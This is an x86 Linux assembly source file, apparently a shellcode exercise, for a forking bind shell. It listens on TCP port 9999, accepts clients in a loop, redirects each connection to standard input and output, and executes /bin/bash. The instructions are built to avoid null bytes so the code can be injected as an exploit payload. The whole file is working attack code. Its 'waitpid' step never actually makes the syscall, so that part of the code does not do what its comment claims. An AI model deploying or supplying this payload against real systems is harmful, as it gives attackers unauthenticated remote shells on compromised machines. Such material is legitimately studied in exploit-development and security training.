; Filename: shell_bind_fork_tcp.nasm
; Author:  Mark Shaneck
; Website:  http://markshaneck.com
;
;
; Purpose: The purpose of this shellcode is to serve shells 
; to multiple clients without exiting


global _start			

section .text
_start:

	; Set up the socket
	; need to call socketcall with args 1, and domain (2), type (1), protocol(6)
	xor eax, eax
	mov al, 6 ; protocol = IPPROTO_TCP
	push eax
	mov al, 1 ; type = SOCK_STREAM
	push eax
	mov al, 2 ; domain = AF_INET
	push eax
	mov al, 102 ; syscall - socketcall
	xor ebx,ebx
	mov bl, 1   ; socket sockcall type
	mov ecx, esp ; pointer to the args
	int 0x80

	; eax now contains the socket file descriptor
	; save it in esi for later usage
	mov esi,eax	

	; Bind to the socket
        ; need to contruct the sockaddr_in
        ; this is 02 00 27 0f 00 00 00 00 00 00 00 00 00 00 00 00 for port 9999
	xor ebx,ebx
	push ebx ; null padding
	push ebx ; null padding
	push ebx ; INADDR_ANY
	mov ebx, 0x2f27f0f2
	and ebx, 0x0fff0f0f ;get 0x0200270f into ebx without any null bytes in the instructions
	push ebx
	mov ebx, esp ; now ebx has the address of the sockaddr_in struct
        xor ecx,ecx
	mov cl, 16
	push ecx
	push ebx
	push esi
	mov ecx, esp
	xor ebx,ebx
	mov bl, 2 ; bind sockcall type
	xor eax,eax
	mov al, 102 ; syscall - socketcall
	int 0x80

	; Listen on the socket
	xor eax,eax
	push eax
	push esi
	mov ecx,esp ; pointer to args
	xor ebx,ebx
	mov bl, 4 ; listen sockcall type
	mov al, 102 ; syscall - socketcall
	int 0x80
	
handle_connections:
	; accept a connection
	xor eax,eax
	mov al, 16
	push eax ; sockaddr_in length
	mov edx, esp ; store address of sockaddr_len
	sub esp, 16 ; allocate space for client sockaddr
	push edx ; address for sockaddr_len
	sub edx, 16
	push edx ; address for client sockaddr
	push esi ; socket file descriptor
	mov ecx, esp ; pointer to args
	xor ebx,ebx
	mov bl, 5 ; accept sockcall type
	mov al, 102 ; syscall - socketcall
	int 0x80

	; avoid memory leak and we don't care about the client sockaddr anyways
	; also we won't process more than one connection at a time
	add esp,32

	; save the clientsocket
	mov edi,eax

	; fork to process the connection
	xor eax,eax
	mov al, 2
	int 0x80
	xor ebx,ebx ; get a 0 to compare against
	cmp eax,ebx ; compare with zero
	je child ; if fork return a zero, we are in the child process
	
	; call waitpid to prevent zombies
	xor edx,edx ; options
	sub esp,4 ; allocate space for return status
	mov ecx,esp
	mov ebx,eax ; child pid
	xor eax,eax 
	mov al, 7 ; waitpid syscall
	add esp,4 ; restore stack from child exit status

	; infinite loop
	jmp handle_connections

child:
	; duplicate the file descriptors
	mov ebx,edi
	xor ecx,ecx
	xor eax,eax
	mov al, 63 ; dup2 syscall
	int 0x80 ; dup2(clientsock, 0)
	mov al, 63
	inc ecx
	int 0x80 ; dup2(clientsock, 1)
	mov al, 63
	inc ecx
	int 0x80 ; dup2(clientsock, 2)
	
	; execve the shell using stack method
 	; let's execute bash
	xor eax,eax
	push eax
	push 0x68736162
	push 0x2f6e6962
	push 0x2f2f2f2f

	mov ebx,esp ; pointer to "////bin/bash"
	push eax
	mov edx,esp ; env pointer (NULL)
	
	push ebx
	mov ecx,esp ; pointer to [pointer to "////bin/bash", 0]

	mov al, 11 ; execve syscall
	int 0x80
	
	
